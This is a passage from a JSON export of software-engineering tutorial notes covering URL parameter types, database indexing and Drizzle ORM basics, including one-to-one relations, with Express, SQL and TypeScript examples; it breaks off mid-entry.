      "content": "# URL Parameter Types: Complete Overview\n\nURL parameters are different methods of passing data through URLs to servers or applications. The main types are path parameters (embedded in the URL path), query parameters (key-value pairs after `?`), and fragments (after `#` for client-side routing). Understanding when to use each type ensures clean, RESTful API design and proper data handling. Think of them like different ways to address a letter—path parameters are the street address (required location), query parameters are delivery instructions (optional filters), and fragments are notes for the recipient (client-side only).\n\n## Key Points\n\n- **Path Parameters:** `/users/:id` - Required, identify specific resources\n- **Query Parameters:** `/users?role=admin` - Optional, filter/modify results\n- **Fragments:** `/page#section` - Client-side only, not sent to server\n- **Matrix Parameters:** `/users;role=admin` - Rare, alternative to query params\n- **Body Parameters:** POST/PUT request body - For large/sensitive data\n\n## Step-by-Step Explanation & Examples\n\n1. **Path Parameters (Resource Identification)**\n\n   ```\n   URL Pattern: /users/:id/posts/:postId\n   Example: /users/123/posts/456\n   \n   Express.js:\n   app.get('/users/:id/posts/:postId', (req, res) => {\n     const userId = req.params.id;        // '123'\n     const postId = req.params.postId;    // '456'\n   });\n   \n   React Router:\n   <Route path=\"/users/:id\" element={<UserProfile />} />\n   \n   function UserProfile() {\n     const { id } = useParams();  // Access path param\n   }\n   \n   Use when: Identifying specific resources (user ID, product ID)\n   ```\n\n2. **Query Parameters (Filtering/Options)**\n\n   ```\n   URL: /products?category=electronics&minPrice=100&sort=price&order=asc\n   \n   Express.js:\n   app.get('/products', (req, res) => {\n     const category = req.query.category;    // 'electronics'\n     const minPrice = req.query.minPrice;    // '100'\n     const sort = req.query.sort;            // 'price'\n   });\n   \n   JavaScript (Building):\n   const params = new URLSearchParams({\n     category: 'electronics',\n     minPrice: 100,\n     sort: 'price'\n   });\n   fetch(`/products?${params}`);\n   \n   Use when: Optional filters, pagination, sorting, search\n   ```\n\n3. **Combining Path and Query Parameters**\n\n   ```\n   URL: /users/123/orders?status=pending&page=2\n   \n   Express.js:\n   app.get('/users/:userId/orders', (req, res) => {\n     const userId = req.params.userId;     // '123' (required)\n     const status = req.query.status;      // 'pending' (optional)\n     const page = req.query.page || 1;     // '2' with default\n   });\n   \n   Pattern: Path params identify resource, query params filter it\n   ```\n\n4. **Fragment/Hash Parameters (Client-Side Only)**\n\n   ```\n   URL: /docs#getting-started\n   URL: /page#section-2\n   \n   JavaScript:\n   // Fragments NOT sent to server\n   window.location.hash;           // '#getting-started'\n   \n   React Router:\n   <Link to=\"/docs#api\">API Docs</Link>\n   \n   useEffect(() => {\n     const hash = window.location.hash.substring(1);\n     const element = document.getElementById(hash);\n     element?.scrollIntoView();\n   }, []);\n   \n   Use when: In-page navigation, client-side routing, scroll positions\n   Note: Never reaches server - browser only\n   ```\n\n5. **Matrix Parameters (Semicolon-Separated)**\n\n   ```\n   URL: /products;color=red;size=large/reviews\n   \n   Express (requires custom parsing):\n   // Less common, mainly in Java/Spring\n   \n   Angular Router:\n   this.router.navigate(['/products', {color: 'red', size: 'large'}]);\n   // Generates: /products;color=red;size=large\n   \n   Use when: Multiple parameters for same path segment (rare in practice)\n   ```\n\n6. **Body Parameters (POST/PUT Requests)**\n\n   ```\n   // Not in URL - sent in request body\n   fetch('/api/users', {\n     method: 'POST',\n     headers: { 'Content-Type': 'application/json' },\n     body: JSON.stringify({\n       name: 'Alice',\n       email: 'alice@example.com',\n       password: 'secret123'\n     })\n   });\n   \n   Express.js:\n   app.post('/api/users', (req, res) => {\n     const { name, email, password } = req.body;\n   });\n   \n   Use when: Creating/updating resources, sensitive data, large payloads\n   ```\n\n## Common Pitfalls\n\n- Using query params for resource identification (`/users?id=123` ❌ → `/users/123` ✅)\n- Putting sensitive data in query params (logged in URLs, visible in browser history)\n- Forgetting to URL-encode special characters in query params\n- Assuming fragments are sent to server (they're client-side only)\n- Using path params for optional filters (makes routing complex)\n- Not validating/sanitizing parameters (security risk)\n\n## Practical Applications\n\n- RESTful APIs (path params for resources, query for filters)\n- Pagination and sorting (query params: `?page=2&limit=20&sort=date`)\n- Search functionality (query params: `?q=javascript&category=tutorials`)\n- Single-page app routing (fragments for client-side navigation)\n- Analytics tracking (query params: `?utm_source=google&utm_campaign=spring`)\n\n## References\n\n- [MDN: URL API](https://developer.mozilla.org/en-US/docs/Web/API/URL)\n- [RFC 3986: URI Syntax](https://www.rfc-editor.org/rfc/rfc3986)\n- [Express.js: Routing](https://expressjs.com/en/guide/routing.html)\n- [REST API Best Practices](https://restfulapi.net/resource-naming/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **RESTful URL Design Patterns:**\n  ```\n  ✅ Good REST design:\n  GET    /users              → List all users\n  GET    /users/123          → Get specific user (path param)\n  GET    /users?role=admin   → Filter users (query param)\n  GET    /users/123/posts    → User's posts (nested resource)\n  POST   /users              → Create user (data in body)\n  PUT    /users/123          → Update user (data in body)\n  DELETE /users/123          → Delete user\n  \n  ❌ Bad REST design:\n  GET /getUser?id=123        → Don't use verbs in path\n  GET /users?action=delete   → Don't use query for actions\n  POST /users/123/delete     → Use DELETE method instead\n  ```\n\n- **Parameter Priority and Override:**\n  ```\n  URL: /api/users/123?id=456\n  \n  // Path parameter takes precedence\n  app.get('/api/users/:id', (req, res) => {\n    const pathId = req.params.id;      // '123' (use this)\n    const queryId = req.query.id;      // '456' (ignore)\n  });\n  \n  Rule: Path params > Query params when both present\n  ```\n\n- **Array Values in Different Parameter Types:**\n  ```\n  Path params (not ideal for arrays):\n  /users/1,2,3/messages  ❌ Hard to parse\n  \n  Query params (multiple approaches):\n  /products?ids=1,2,3              → Comma-separated\n  /products?ids[]=1&ids[]=2&ids[]=3 → Array notation\n  /products?ids=1&ids=2&ids=3      → Repeated keys\n  \n  Express parsing:\n  app.get('/products', (req, res) => {\n    const ids = req.query.ids;  // ['1', '2', '3'] or '1,2,3'\n    const idsArray = Array.isArray(ids) \n      ? ids \n      : ids.split(',');\n  });\n  ```\n\n- **OpenAPI/Swagger Parameter Types:**\n  ```yaml\n  # Path parameter\n  /users/{userId}:\n    get:\n      parameters:\n        - name: userId\n          in: path          # 'path' location\n          required: true\n          schema:\n            type: integer\n  \n  # Query parameter\n  /products:\n    get:\n      parameters:\n        - name: category\n          in: query         # 'query' location\n          required: false\n          schema:\n            type: string\n  \n  # Header parameter\n  parameters:\n    - name: X-API-Key\n      in: header          # 'header' location\n      required: true\n  \n  # Cookie parameter\n  parameters:\n    - name: sessionId\n      in: cookie          # 'cookie' location\n  ```\n\n- **TypeScript Type Safety:**\n  ```typescript\n  // Path params with type safety\n  type UserRouteParams = {\n    userId: string;\n  };\n  \n  // React Router\n  const { userId } = useParams<UserRouteParams>();\n  \n  // Express with TypeScript\n  interface RequestParams {\n    id: string;\n  }\n  \n  interface RequestQuery {\n    status?: string;\n    page?: string;\n  }\n  \n  app.get('/users/:id', (\n    req: Request<RequestParams, {}, {}, RequestQuery>,\n    res: Response\n  ) => {\n    const id = req.params.id;        // Type: string\n    const status = req.query.status; // Type: string | undefined\n  });\n  ```\n\n- **Security Considerations:**\n  ```\n  ❌ Avoid in URLs (visible in logs, history):\n  /login?password=secret123\n  /api/users?apiKey=xyz789\n  /checkout?creditCard=1234567890\n  \n  ✅ Use request body or headers instead:\n  POST /login\n  Body: { username: 'alice', password: 'secret123' }\n  \n  Headers: { 'Authorization': 'Bearer token123' }\n  \n  Safe for URLs:\n  - Public IDs (user IDs, product IDs)\n  - Filter criteria (categories, dates)\n  - Pagination (page numbers)\n  - Non-sensitive search terms\n  ```\n\n- **Encoding and Decoding:**\n  ```javascript\n  // Manual encoding\n  const search = 'coffee & tea';\n  const encoded = encodeURIComponent(search);\n  // 'coffee%20%26%20tea'\n  \n  fetch(`/search?q=${encoded}`);\n  \n  // URLSearchParams handles automatically\n  const params = new URLSearchParams({\n    q: 'coffee & tea',\n    category: 'drinks/hot'\n  });\n  // q=coffee+%26+tea&category=drinks%2Fhot\n  \n  // Decoding (Express does automatically)\n  const decoded = decodeURIComponent('coffee%20%26%20tea');\n  // 'coffee & tea'\n  ```\n\n- **Parameter Validation:**\n  ```typescript\n  // Express with validation middleware\n  import { param, query, validationResult } from 'express-validator';\n  \n  app.get('/users/:id',\n    param('id').isInt().toInt(),\n    query('page').optional().isInt().toInt(),\n    query('limit').optional().isInt().toInt().custom(val => val <= 100),\n    (req, res) => {\n      const errors = validationResult(req);\n      if (!errors.isEmpty()) {\n        return res.status(400).json({ errors: errors.array() });\n      }\n      \n      const id = req.params.id;     // Validated integer\n      const page = req.query.page || 1;\n      const limit = req.query.limit || 10;\n    }\n  );\n  ```\n\n- **Real-World Comparison:**\n  ```\n  GitHub API Examples:\n  \n  Path params (resource identification):\n  GET /repos/:owner/:repo\n  → /repos/facebook/react\n  \n  Query params (filtering/pagination):\n  GET /repos/:owner/:repo/issues?state=open&page=2&per_page=50\n  \n  Combined:\n  GET /search/repositories?q=language:javascript&sort=stars&order=desc\n  \n  Stripe API Examples:\n  \n  Path params:\n  GET /v1/customers/:id\n  → /v1/customers/cus_123abc\n  \n  Query params (expansion):\n  GET /v1/charges?customer=cus_123&limit=10\n  \n  Body params (creating):\n  POST /v1/customers\n  Body: { email: 'user@example.com', name: 'Alice' }\n  ```\n\n- **Best Practices Summary:**\n  ```\n  Path Parameters:\n  ✅ Required resource identifiers\n  ✅ Hierarchical relationships (/users/123/posts/456)\n  ✅ RESTful resource paths\n  ❌ Optional filters or metadata\n  ❌ Lists or arrays\n  \n  Query Parameters:\n  ✅ Optional filters and search\n  ✅ Pagination (page, limit, offset)\n  ✅ Sorting (sort, order)\n  ✅ Multiple values (tags, categories)\n  ❌ Required resource identifiers\n  ❌ Sensitive data\n  \n  Body Parameters:\n  ✅ Creating/updating resources\n  ✅ Sensitive data (passwords, tokens)\n  ✅ Large payloads (file uploads, complex objects)\n  ✅ Structured data (nested objects, arrays)\n  ❌ Simple GET requests\n  ❌ Idempotent operations better suited for URL\n  \n  Fragments:\n  ✅ Client-side navigation\n  ✅ Scroll positions\n  ✅ SPA routing\n  ❌ Server-side logic (not sent to server)\n  ❌ SEO-critical content\n  ```"
    },
    {
      "id": "swe/backend/databases/db_indexing",
      "title": "Database Indexing: A Well-Structured Overview",
      "path": [
        "swe",
        "backend",
        "databases",
        "db_indexing"
      ],
      "content": "# Database Indexing: A Well-Structured Overview\n\nDatabase indexes are data structures that improve the speed of data retrieval operations by creating optimized lookup paths, similar to how a book's index helps you find topics without reading every page.\n\n## Key Points\n\n- **Definition:** Auxiliary data structures that store a subset of table data in a format optimized for fast searches and lookups.\n- **Performance Trade-off:** Dramatically speeds up reads but slows down writes (INSERT, UPDATE, DELETE) due to index maintenance.\n- **Types:** Common types include B-tree (default), Hash, GiST, GIN, and BRIN, each suited for different query patterns.\n- **Selectivity:** Most effective on columns with high cardinality (many unique values) and frequently used in WHERE, JOIN, or ORDER BY clauses.\n- **Storage Overhead:** Indexes consume additional disk space, sometimes as much as the table itself.\n- **Maintenance:** Require periodic rebuilding or vacuuming to maintain efficiency, especially after bulk operations.\n- **Query Planner:** The database optimizer decides whether to use an index based on cost estimates.\n\n## Step-by-Step Explanation & Examples\n\n1. **Creating a Basic Index**\n   ```sql\n   CREATE INDEX idx_users_email ON users(email);\n   \n   -- Unique index (also enforces uniqueness)\n   CREATE UNIQUE INDEX idx_users_username ON users(username);\n   ```\n\n2. **Composite (Multi-Column) Index**\n   ```sql\n   CREATE INDEX idx_orders_user_date ON orders(user_id, created_at);\n   \n   -- Efficient for queries like:\n   SELECT * FROM orders WHERE user_id = 123 AND created_at > '2024-01-01';\n   ```\n\n3. **Partial Index (Filtered)**\n   ```sql\n   CREATE INDEX idx_active_users ON users(email) WHERE active = true;\n   \n   -- Only indexes active users, saving space and improving performance\n   ```\n\n4. **Checking Index Usage**\n   ```sql\n   EXPLAIN ANALYZE SELECT * FROM users WHERE email = 'john@example.com';\n   \n   -- Look for \"Index Scan\" vs \"Seq Scan\" in output\n   ```\n\n5. **Viewing Existing Indexes**\n   ```sql\n   \\di                   -- In psql: list all indexes\n   \n   SELECT indexname, indexdef \n   FROM pg_indexes \n   WHERE tablename = 'users';\n   ```\n\n6. **Dropping an Index**\n   ```sql\n   DROP INDEX idx_users_email;\n   ```\n\n## Common Pitfalls\n\n- Over-indexing tables, which slows down writes and wastes storage without improving read performance.\n- Wrong column order in composite indexes—the leftmost column must match your query filters.\n- Indexing low-cardinality columns (e.g., boolean fields) where sequential scans are often faster.\n- Ignoring unused indexes—they still consume resources during writes.\n- Not accounting for index bloat after heavy UPDATE/DELETE operations.\n- Assuming indexes always help—small tables often perform better with sequential scans.\n\n## Practical Applications\n\n- **API Performance:** Indexing foreign keys and commonly filtered columns to reduce response times.\n- **Search Features:** Full-text search indexes (GIN) for text search functionality.\n- **Reporting Queries:** Covering indexes that include all columns needed, avoiding table lookups.\n- **Unique Constraints:** Enforcing data integrity while providing lookup optimization.\n\n**Example anecdote:** On a project with a growing users table, our login endpoint started timing out at 50k users. Adding a simple index on the email column (which we filtered on every login) dropped query time from 1.2 seconds to 3ms—problem solved in one line of SQL.\n\n## References\n\n- [PostgreSQL: Indexes](https://www.postgresql.org/docs/current/indexes.html)\n- [Use The Index, Luke](https://use-the-index-luke.com/)\n- [MySQL Indexing Best Practices](https://dev.mysql.com/doc/refman/8.0/en/optimization-indexes.html)\n- [MongoDB Index Strategies](https://www.mongodb.com/docs/manual/indexes/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Covering Indexes:** Include all columns needed by a query to avoid accessing the table (e.g., `CREATE INDEX idx_cover ON users(id, email, name)`).\n- **Index-Only Scans:** Query satisfied entirely from index without touching the table data.\n- **Expression Indexes:** Index computed values (e.g., `CREATE INDEX idx_lower_email ON users(LOWER(email))`).\n- **Index Types Deep Dive:**\n  - **B-tree:** Default, balanced tree structure for equality and range queries\n  - **Hash:** Fast equality lookups only, no range queries\n  - **GiST/GIN:** For full-text search, arrays, JSON, and geometric data\n  - **BRIN:** Block Range INdexes for very large tables with natural ordering\n- **Fill Factor:** Control how densely packed index pages are to reduce page splits during writes.\n- **Concurrent Indexing:** Use `CREATE INDEX CONCURRENTLY` to build indexes without blocking writes (PostgreSQL).\n- **Index Statistics:** Analyze index usage with `pg_stat_user_indexes` to identify unused indexes.\n- **Bitmap Index Scans:** Database combines multiple indexes for complex queries.\n- **Clustered vs Non-Clustered:** Clustered indexes determine physical row order (one per table), non-clustered are separate structures.\n- **Index Fragmentation:** Monitor and rebuild fragmented indexes for optimal performance.\n- **Partitioned Table Indexes:** Strategy for indexing across table partitions efficiently.\n- **Cost-Based Optimization:** Understand how the query planner estimates costs to use indexes effectively."
    },
    {
      "id": "swe/backend/databases/drizzle/drizzle-intro",
      "title": "Drizzle ORM: A Well-Structured Overview",
      "path": [
        "swe",
        "backend",
        "databases",
        "drizzle",
        "drizzle-intro"
      ],
      "content": "# Drizzle ORM: A Well-Structured Overview\n\nDrizzle is a TypeScript-first ORM that provides type-safe database operations with a SQL-like query builder, offering zero-cost abstractions and automatic type inference from schema definitions.\n\n## Key Points\n\n- **Definition:** Lightweight TypeScript ORM with SQL-like syntax, emphasizing type safety and developer experience without runtime overhead.\n- **Type Safety:** Automatic TypeScript types derived from schema—no code generation or type declaration files needed.\n- **SQL-Like Syntax:** Query builder mirrors SQL structure, making it familiar for developers with SQL knowledge.\n- **Database Support:** PostgreSQL, MySQL, SQLite with consistent API across different databases.\n- **Migrations:** Built-in migration system with auto-generation from schema changes.\n- **Performance:** Minimal runtime overhead with direct SQL generation—no query parsing at runtime.\n- **Relations:** Type-safe joins and relations with automatic type inference for nested queries.\n\n## Step-by-Step Explanation & Examples\n\n**Schema Definition**\n```typescript\nimport { pgTable, serial, text, integer, timestamp } from 'drizzle-orm/pg-core';\n\n// Define table schema\nexport const users = pgTable('users', {\n  id: serial('id').primaryKey(),\n  // serial: Auto-incrementing integer, primary key\n  \n  name: text('name').notNull(),\n  // text: String type, notNull() makes it required\n  \n  email: text('email').notNull().unique(),\n  // unique(): Enforces unique constraint\n  \n  age: integer('age'),\n  // Optional field (nullable by default)\n  \n  createdAt: timestamp('created_at').defaultNow(),\n  // defaultNow(): Automatic timestamp on insert\n});\n\nexport const posts = pgTable('posts', {\n  id: serial('id').primaryKey(),\n  title: text('title').notNull(),\n  content: text('content'),\n  userId: integer('user_id').references(() => users.id),\n  // references(): Foreign key to users.id\n  \n  publishedAt: timestamp('published_at'),\n});\n\n// TypeScript types automatically inferred\ntype User = typeof users.$inferSelect;  // Select type\ntype NewUser = typeof users.$inferInsert; // Insert type\n```\n\n**Basic CRUD Operations**\n```typescript\nimport { drizzle } from 'drizzle-orm/node-postgres';\nimport { eq, and, or, gt, like } from 'drizzle-orm';\n\nconst db = drizzle(pool);\n\n// INSERT - Create new records\nawait db.insert(users).values({\n  name: 'Alice',\n  email: 'alice@example.com',\n  age: 30\n});\n// values(): Object matching schema types\n\n// Insert multiple\nawait db.insert(users).values([\n  { name: 'Bob', email: 'bob@test.com' },\n  { name: 'Charlie', email: 'charlie@test.com' }\n]);\n\n// SELECT - Query records\nconst allUsers = await db.select().from(users);\n// Returns: User[] with full type safety\n\n// Specific columns\nconst names = await db\n  .select({ name: users.name, email: users.email })\n  .from(users);\n// Returns: { name: string, email: string }[]\n\n// WHERE conditions\nconst user = await db\n  .select()\n  .from(users)\n  .where(eq(users.email, 'alice@example.com'));\n// eq(): Equality operator (=)\n\n// Multiple conditions\nconst filteredUsers = await db\n  .select()\n  .from(users)\n  .where(\n    and(\n      gt(users.age, 25),        // Greater than (>)\n      like(users.email, '%@example.com')  // LIKE pattern\n    )\n  );\n\n// UPDATE - Modify records\nawait db\n  .update(users)\n  .set({ age: 31 })\n  .where(eq(users.id, 1));\n// set(): Object with fields to update\n\n// DELETE - Remove records\nawait db\n  .delete(users)\n  .where(eq(users.id, 1));\n```\n\n**Joins and Relations**\n```typescript\n// Define relations (separate from schema)\nimport { relations } from 'drizzle-orm';\n\nexport const usersRelations = relations(users, ({ many }) => ({\n  posts: many(posts),\n  // one-to-many: user has many posts\n}));\n\nexport const postsRelations = relations(posts, ({ one }) => ({\n  author: one(users, {\n    fields: [posts.userId],\n    references: [users.id],\n  }),\n  // many-to-one: post belongs to one user\n}));\n\n// Query with joins\nconst usersWithPosts = await db\n  .select()\n  .from(users)\n  .leftJoin(posts, eq(users.id, posts.userId));\n// Returns: Array of { users: User, posts: Post | null }\n\n// Relational queries (simpler syntax)\nconst result = await db.query.users.findMany({\n  with: {\n    posts: true,\n    // Automatically includes related posts\n  },\n});\n// Returns: User[] with nested posts array\n\n// Filtered relations\nconst usersWithPublishedPosts = await db.query.users.findMany({\n  with: {\n    posts: {\n      where: (posts, { isNotNull }) => isNotNull(posts.publishedAt),\n    },\n  },\n});\n```\n\n**Advanced Queries**\n```typescript\nimport { desc, asc, count, avg, sum } from 'drizzle-orm';\n\n// Ordering\nconst sortedUsers = await db\n  .select()\n  .from(users)\n  .orderBy(desc(users.createdAt), asc(users.name));\n// desc(): Descending order\n// asc(): Ascending order (multiple sorting)\n\n// Pagination\nconst page = await db\n  .select()\n  .from(users)\n  .limit(10)\n  .offset(20);\n// limit: Number of records\n// offset: Skip records (for page 3: offset = 20)\n\n// Aggregations\nconst stats = await db\n  .select({\n    total: count(),\n    avgAge: avg(users.age),\n    totalAge: sum(users.age),\n  })\n  .from(users);\n\n// Subqueries\nconst activeUsers = db\n  .select({ id: users.id })\n  .from(users)\n  .where(gt(users.age, 18));\n\nconst postsFromActiveUsers = await db\n  .select()\n  .from(posts)\n  .where(inArray(posts.userId, activeUsers));\n// inArray(): SQL IN operator with subquery\n```\n\n**Transactions**\n```typescript\n// Transaction - all or nothing\nawait db.transaction(async (tx) => {\n  const user = await tx\n    .insert(users)\n    .values({ name: 'Dave', email: 'dave@test.com' })\n    .returning();\n  // returning(): Returns inserted record\n  \n  await tx.insert(posts).values({\n    title: 'First post',\n    userId: user[0].id,\n  });\n  \n  // If any query fails, all changes rollback\n});\n```\n\n## Common Pitfalls\n\n- Using JavaScript comparison operators instead of Drizzle operators—must use `eq()`, `gt()`, not `===`, `>`.\n- Forgetting `await` on queries—returns Promise, not actual data.\n- Not defining relations for relational queries—`db.query` requires relations to be defined separately.\n- Comparing wrong types in where clauses—TypeScript helps but runtime errors still possible.\n- Not using transactions for multi-step operations—partial updates can occur on failures.\n- Confusing schema definition with relations—relations are defined separately from table schemas.\n- Using `select()` without `from()`—incomplete query chain causes errors.\n\n## Practical Applications\n\n- **API Backends:** Type-safe database queries in REST/GraphQL APIs with automatic type inference.\n- **Data Migrations:** Schema versioning and migrations with automatic SQL generation.\n- **Admin Dashboards:** CRUD operations with complex filtering and sorting requirements.\n- **Multi-Tenant Apps:** Database-per-tenant or schema-per-tenant with consistent query patterns.\n\n## References\n\n- [Drizzle ORM Documentation](https://orm.drizzle.team/docs/overview)\n- [Drizzle Schema Definition](https://orm.drizzle.team/docs/sql-schema-declaration)\n- [Drizzle Queries](https://orm.drizzle.team/docs/rqb)\n- [Drizzle Kit (Migrations)](https://orm.drizzle.team/kit-docs/overview)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Schema Columns Types:** `serial`, `integer`, `text`, `varchar`, `boolean`, `json`, `timestamp`, `date`, `real`, `doublePrecision`, custom types.\n- **Column Modifiers:** `.notNull()`, `.default()`, `.unique()`, `.primaryKey()`, `.references()`, `.onDelete('cascade')`.\n- **Operators:** `eq`, `ne`, `gt`, `gte`, `lt`, `lte`, `like`, `ilike`, `inArray`, `notInArray`, `isNull`, `isNotNull`, `between`, `notBetween`.\n- **Logical Operators:** `and()`, `or()`, `not()` for combining conditions.\n- **Prepared Statements:** Improve performance with reusable parameterized queries.\n  ```typescript\n  const prepared = db.select().from(users).where(eq(users.id, placeholder('id'))).prepare();\n  await prepared.execute({ id: 1 });\n  ```\n- **Raw SQL:** Escape hatch for complex queries using `sql` template tag.\n  ```typescript\n  const result = await db.execute(sql`SELECT * FROM users WHERE age > ${25}`);\n  ```\n- **Database Introspection:** Generate schema from existing database with `drizzle-kit pull`.\n- **Migration Generation:** Auto-generate SQL migrations with `drizzle-kit generate:pg`.\n- **Multiple Schemas:** Support for PostgreSQL schemas beyond public schema.\n- **Indexes:** Define indexes for query performance optimization.\n  ```typescript\n  index('email_idx').on(users.email)\n  ```\n- **Composite Keys:** Multi-column primary keys with `.primaryKey()` on multiple columns.\n- **Views:** Define database views with type safety.\n- **Enum Types:** PostgreSQL enums with `pgEnum()` for constrained values.\n- **JSON Operations:** Query JSON/JSONB columns with type-safe operators.\n- **Connection Pooling:** Works with pg, postgres.js, better-sqlite3, mysql2 connection pools.\n- **Batch Operations:** `db.batch()` for executing multiple queries efficiently.\n- **Upsert:** `onConflictDoUpdate()` for insert-or-update operations.\n- **Partial Selects:** Select subset of columns with automatic type narrowing.\n- **Query Builder Chaining:** Compose queries incrementally for dynamic filtering.\n- **Type-Safe Migrations:** Schema changes tracked with TypeScript types."
    },
    {
      "id": "swe/backend/databases/drizzle/drizzle-one-to-one",
      "title": "Drizzle ORM One-to-One Relationships: Complete Overview",
      "path": [
        "swe",
        "backend",
        "databases",
        "drizzle",
        "drizzle-one-to-one"
      ],
      "content": "# Drizzle ORM One-to-One Relationships: Complete Overview\n\nDrizzle is a TypeScript ORM (Object-Relational Mapping) that lets you define database schemas and relationships using TypeScript code instead of writing raw SQL. A one-to-one relationship means one record in Table A connects to exactly one record in Table B—like one user having exactly one account profile. Think of it like a marriage certificate—each person has exactly one certificate, and each certificate belongs to exactly one person.\n\n## Key Points\n\n- **One-to-One:** Each user has exactly one account, each account belongs to one user\n- **Foreign Key:** Column in one table that references primary key in another table\n- **Schema Definition:** Use `relations()` to define how tables connect\n- **Type Safety:** Drizzle generates TypeScript types from your schema\n- **Queries:** Use `.with()` to fetch related data in one query\n\n## Step-by-Step Explanation & Examples\n\n1. **Database Concept: Tables and Primary Keys**\n\n   ```\n   Imagine a filing cabinet with two drawers:\n   \n   Drawer 1 (Users Table):\n   ┌────┬────────┬───────────────────┐\n   │ id │ name   │ email             │\n   ├────┼────────┼───────────────────┤\n   │ 1  │ Alice  │ alice@example.com │\n   │ 2  │ Bob    │ bob@example.com   │\n   └────┴────────┴───────────────────┘\n   \n   Drawer 2 (Accounts Table):\n   ┌────┬─────────┬──────────┬────────┐\n   │ id │ userId  │ provider │ token  │\n   ├────┼─────────┼──────────┼────────┤\n   │ 10 │ 1       │ google   │ abc123 │\n   │ 11 │ 2       │ github   │ xyz789 │\n   └────┴─────────┴──────────┴────────┘\n   \n   Primary Key (id): Unique identifier for each row\n   Foreign Key (userId): References id in Users table\n   \n   Relationship: Account with userId=1 belongs to User with id=1\n   ```\n\n2. **Basic Drizzle Setup**\n\n   ```typescript\n   // db/schema.ts\n   import { pgTable, serial, text, integer } from 'drizzle-orm/pg-core';\n   \n   // Users table definition\n   export const users = pgTable('users', {\n     id: serial('id').primaryKey(),           // Auto-incrementing ID\n     name: text('name').notNull(),            // Required text field\n     email: text('email').notNull().unique()  // Required, must be unique\n   });\n   \n   // Accounts table definition\n   export const accounts = pgTable('accounts', {\n     id: serial('id').primaryKey(),\n     userId: integer('user_id').notNull(),    // Foreign key to users.id\n     provider: text('provider').notNull(),    // e.g., 'google', 'github'\n     token: text('token').notNull()\n   });\n   ```\n\n3. **Defining One-to-One Relationship**\n\n   ```typescript\n   // db/schema.ts\n   import { pgTable, serial, text, integer } from 'drizzle-orm/pg-core';\n   import { relations } from 'drizzle-orm';\n   \n   export const users = pgTable('users', {\n     id: serial('id').primaryKey(),\n     name: text('name').notNull(),\n     email: text('email').notNull().unique()\n   });\n   \n   export const accounts = pgTable('accounts', {\n     id: serial('id').primaryKey(),\n     userId: integer('user_id')\n       .notNull()\n       .references(() => users.id),  // ← Foreign key reference\n     provider: text('provider').notNull(),\n     token: text('token').notNull()\n   });\n   \n   // Define relationships\n   export const usersRelations = relations(users, ({ one }) => ({\n     account: one(accounts, {\n       fields: [users.id],           // This table's field\n       references: [accounts.userId] // References account's userId\n     })\n   }));\n   \n   export const accountsRelations = relations(accounts, ({ one }) => ({\n     user: one(users, {\n       fields: [accounts.userId],    // This table's field\n       references: [users.id]        // References user's id\n     })\n   }));\n   ```\n\n4. **Database Connection Setup**\n\n   ```typescript\n   // db/index.ts\n   import { drizzle } from 'drizzle-orm/node-postgres';\n   import { Pool } from 'pg';\n   import * as schema from './schema';\n   \n   // Create PostgreSQL connection pool\n   const pool = new Pool({\n     host: 'localhost',\n     port: 5432,\n     user: 'postgres',\n     password: 'password',\n     database: 'myapp'\n   });\n   \n   // Create Drizzle instance with schema\n   export const db = drizzle(pool, { schema });\n   ```\n\n5. **Creating Records (Insert)**\n\n   ```typescript\n   import { db } from './db';\n   import { users, accounts } from './db/schema';\n   \n   // Create a user\n   async function createUser() {\n     const [newUser] = await db\n       .insert(users)\n       .values({\n         name: 'Alice',\n         email: 'alice@example.com'\n       })\n       .returning(); // Returns the created user with id\n     \n     console.log('Created user:', newUser);\n     // { id: 1, name: 'Alice', email: 'alice@example.com' }\n     \n     return newUser;\n   }\n   \n   // Create an account for the user\n   async function createAccount(userId: number) {\n     const [newAccount] = await db\n       .insert(accounts)\n       .values({\n         userId: userId,        // Links to user\n         provider: 'google',\n         token: 'abc123xyz'\n       })\n       .returning();\n     \n     console.log('Created account:', newAccount);\n     // { id: 10, userId: 1, provider: 'google', token: 'abc123xyz' }\n     \n     return newAccount;\n   }\n   \n   // Usage\n   const user = await createUser();\n   const account = await createAccount(user.id);\n   ```\n\n6. **Querying with Relationships (Join)**\n\n   ```typescript\n   import { db } from './db';\n   import { users } from './db/schema';\n   import { eq } from 'drizzle-orm';\n   \n   // Get user with their account\n   async function getUserWithAccount(userId: number) {\n     const result = await db.query.users.findFirst({\n       where: eq(users.id, userId),\n       with: {\n         account: true  // Include related account\n       }\n     });\n     \n     console.log(result);\n     /* {\n       id: 1,\n       name: 'Alice',\n       email: 'alice@example.com',\n       account: {\n         id: 10,\n         userId: 1,\n         provider: 'google',\n         token: 'abc123xyz'\n       }\n     } */\n     \n     return result;\n   }\n   \n   // Get account with its user\n   async function getAccountWithUser(accountId: number) {\n     const result = await db.query.accounts.findFirst({\n       where: eq(accounts.id, accountId),\n       with: {\n         user: true  // Include related user\n       }\n     });\n     \n     return result;\n     /* {\n       id: 10,\n       userId: 1,\n       provider: 'google',\n       token: 'abc123xyz',\n       user: {\n         id: 1,\n         name: 'Alice',\n         email: 'alice@example.com'\n       }\n     } */\n   }\n   ```\n\n7. **Updating and Deleting**\n\n   ```typescript\n   import { db } from './db';\n   import { users, accounts } from './db/schema';\n   import { eq } from 'drizzle-orm';\n   \n   // Update user\n   async function updateUser(userId: number, newName: string) {\n     const [updated] = await db\n       .update(users)\n       .set({ name: newName })\n       .where(eq(users.id, userId))\n       .returning();\n     \n     return updated;\n   }\n   \n   // Delete account (must delete child before parent)\n   async function deleteUserAndAccount(userId: number) {\n     // Delete account first (has foreign key to user)\n     await db\n       .delete(accounts)\n       .where(eq(accounts.userId, userId));\n     \n     // Then delete user\n     await db\n       .delete(users)\n       .where(eq(users.id, userId));\n     \n     console.log('Deleted user and account');\n   }\n   \n   // Alternative: Use CASCADE in schema to auto-delete\n   export const accounts = pgTable('accounts', {\n     id: serial('id').primaryKey(),\n     userId: integer('user_id')\n       .notNull()\n       .references(() => users.id, { onDelete: 'cascade' })  // ← Auto-delete\n   });\n   ```\n\n## Common Pitfalls\n\n- Forgetting `.references()` when defining foreign keys (relationship won't work)\n- Not using `.returning()` after insert (can't get the created record's id)\n- Trying to delete parent before child (foreign key constraint violation)\n- Not defining `relations()` separately (queries won't include related data)\n- Using wrong field names in relations (must match exactly)\n- Forgetting to import schema when creating db instance\n\n## Practical Applications\n\n- User authentication (user + account provider like 